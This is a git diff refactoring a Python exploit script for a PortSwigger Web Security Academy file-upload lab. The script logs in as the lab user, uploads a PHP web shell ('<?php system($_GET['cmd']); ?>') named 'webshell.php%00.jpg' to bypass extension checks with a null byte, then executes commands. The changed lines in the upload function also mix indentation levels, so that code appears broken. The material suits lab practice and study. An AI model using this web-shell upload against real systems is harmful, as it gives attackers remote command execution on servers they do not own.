@@ -8,9 +8,8 @@ def extract_csrf_token(response):
     return csrf_token
 
 def login():
-    url = f"{lab_url}/login"
-    response_one = requests.get(url)
-    session_cookie = response_one.cookies.values()[0]
+    response_one = requests.get(f"{lab_url}/login")
+    cookie_one = response_one.cookies.values()[0]
     csrf_token = extract_csrf_token(response_one)
 
     login_data = {
@@ -19,28 +18,25 @@ def login():
         "password": "peter"
     }
 
-    response_two = requests.post(url, cookies={"session": session_cookie}, data=login_data, allow_redirects=False)
-    cookie = response_two.cookies.values()[0]
-    return cookie
+    response_two = requests.post(f"{lab_url}/login", cookies={"session": cookie_one}, data=login_data, allow_redirects=False)
+    cookie_two = response_two.cookies.values()[0]
+    return cookie_two
 
 
 def upload_file():
-    my_account_url = f"{lab_url}/my-account"
-    response_one = requests.get(my_account_url, cookies={"session": cookie})
-    csrf_token = extract_csrf_token(response_one)
+   response = requests.get(f"{lab_url}/my-account", cookies={"session": cookie})
+   csrf_token = extract_csrf_token(response)
 
-    file = {
+   file = {
         "avatar": ("webshell.php%00.jpg", "<?php system($_GET['cmd']); ?>", "application/x-php"),
     }
 
-    data = {
+   data = {
         "user": "wiener",
         "csrf": csrf_token,
     }
 
-    upload_url = f"{lab_url}/my-account/avatar"
-    response_two = requests.post(upload_url, cookies={"session": cookie}, files=file, data=data)
-    return response_two
+   requests.post(f"{lab_url}/my-account/avatar", cookies={"session": cookie}, files=file, data=data)
 
 
 def execute_command():
@@ -60,3 +56,4 @@ if __name__ == "__main__":
 
     except IndexError:
         print(f"Usage: python3 {sys.argv[0]} <url> \nExample: python3 {sys.argv[0]} https://0aa000b30398e74d82a6069b002d00f8.web-security-academy.net")
+
